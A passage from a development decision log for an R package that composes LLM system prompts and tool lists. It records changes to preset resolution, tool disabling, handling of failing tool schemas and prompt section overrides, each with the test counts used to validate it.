   prompts `"S"`; `"S" %>% gptr("more")` prompts `"more"`; `"S" %>% gptr(q, .)` gives NA, since
   `q` may hold the prompt). A user-defined `%>%` with other semantics is not recognised.

Validation: `progress/P15.md`, Task 2 (`test-doc-blocks.R`). The plan's 46 expectations are
unchanged. Forty-nine were added: 5 C-locale, 6 for the parse memo and `line_offset`, 3
ownership, 4 parse data, 3 for `prompt =`, 10 for call texts and long literals (run in both the C
and a UTF-8 locale), 9 for native pipes, 4 for source references and 5 for magrittr pipes.
Review round 3 also corrected one round-2 expectation: it now checks the piped call that the
file's own parse gives. Against the plan literal the added blocks fail 27: 15 before round 3, 1
more in the round-2 block, 6 in the round-3 blocks and 5 added in round 4
(`dev/.validation/P15/task2-adapt-red.log`, `task2-fix1-adapt-red.log`,
`task2-fix2-adapt-red.log`, `task2-fix3-adapt-red-round2.log`, `task2-fix3-adapt-red.log`,
`task2-fix4-adapt-red.log`). Final `^doc-blocks$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 154 ]` in
the UTF-8 and the C locale.

## D-065 - P07 composition: a session preset equal to the configured one is not an explicit choice, `tools.disable` also drops plugin direct tools, a failing tool schema leaves that tool out, section overrides follow Pi's rule without widening the preset (2026-10-04)

P07 Task 4's plan-literal `prompt_compose()` / `prompt_compose_preset()` / `prompt_tool_array()`
(`R/prompt-sections.R`) were changed in three ways, and the review of Task 4 added three more to
`prompt_sections_render()` / `prompt_system_overrides()`. Signatures and the frozen list are
unchanged.

1. **The configured preset is not an explicit preset.** The plan took
   `explicit = opts$preset %||% d$preset`, but P06's real `session_new()` stores
   `preset %||% setting_get("preset", default = "standard")`, so `d$preset` is never `NULL` for a
   session. The user's `tools.presets` mapping and IC-73's shipped `extended` defaults (Gemini 3,
   Haiku 4.5 past break-even) then never applied to a real session, only to
   `gptr_prompt(NULL)`. P08 passes `preset = NULL` to `session_new()` and leaves `preset` out of
   the run options when the user names none (`gateway_preset()`), so the session's own preset is
   now explicit only when it differs from setting `preset`; `opts$preset` always wins. A caller
   that names exactly the configured preset (session_new() without `opts$preset`) is treated as
   not having chosen one; P06 records no separate flag, and P06's file is not changed.
   `prompt_compose_preset()` also passes `session = sid` to `preset_tools()` (Task 3 review), so a
   session's rank-0 preset (IC-69 session scope) composes instead of aborting "Unknown preset".
2. **`tools.disable` drops plugin direct tools.** The plan removed the always-declared
   un-namespaced direct tools (IC-37) only for `-name` run modifiers; the `tools.disable` setting
   (04 section 11.2 `tools {enable, disable, presets}`) removed only preset tools, so a disabled
   plugin tool stayed in the array. Both now remove it.
3. **A failing tool declaration leaves that tool out.** The plan let an error of a tool's
   `parameters(ctx)` stop the whole freeze (every run of the session) and dropped an erroring
   `available(ctx)` silently. As P06's fallback freeze (`freeze_tool_decl()`) does, the tool is now
   left out with a diagnostic when `available()` or `parameters()` fails or the schema is not a
   JSON Schema with `type = "object"` (contract section 9.1); a plain `FALSE` from `available()`
   stays silent.
4. **The Pi-rule core replacement has no section budget.** A trusted `.gptr/SYSTEM.md`, the
   user's `SYSTEM.md` or a string `.opts$system` replaces `preamble`, `tools` and `rules`
   (04 section 9.3, 03 section 7.3). The plan stored it as the `preamble` override and cut it to
   the preamble's 120 tokens. Contract and architecture give the replacement no budget, and Pi
   applies none. The replacement now carries the attribute `core`, and only that text skips the
   budget check. Named overrides (`.opts$system` list, `session_start` sections) keep their
   section's budget. A blank replacement (an empty SYSTEM.md, `.opts$system = ""`) replaces
   nothing, and a blank named override omits its section, as a provider's empty text does.
5. **Overrides never change inclusion.** The plan matched overrides against the rendered rows
   only, so an override of a registered section that the preset excludes became a new T0 section
   at order 760. A T1 `r_env` then landed in T0 after `<context>` (03 section 7.3: T0 ends after
   `<context>`). Such an override is now dropped: the preset record decides inclusion (IC-69),
   and a `session_start` override cannot widen a minimal sub-agent prompt. Only unregistered
   names still become T0 sections at 760.
6. **Fragments honour overrides.** A named override of an `r_session` fragment (a
   `prompt_section` with `parent`) now replaces its text, or removes it for `NULL` or blank text,
   inside the parent ("a named `.opts$system` list overrides named sections (`NULL` removes)").
   The plan ignored it, and a string added a stray `<shell>` section beside the original line.

Validation: `progress/P07.md`, Task 4. The plan's 12 tests are unchanged and pass on both the
plan literal and the adapted code. Items 1-3 added 4 tests (19 expectations); against the plan
literal they fail 6 (`dev/.validation/P07/task4-plan-literal2.log`). Items 4-6 added 4 tests
(30 expectations); against the pre-review source they fail 20 (`task4-fix1-red2.log`). Final
`^prompt-sections$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 185 ]`.
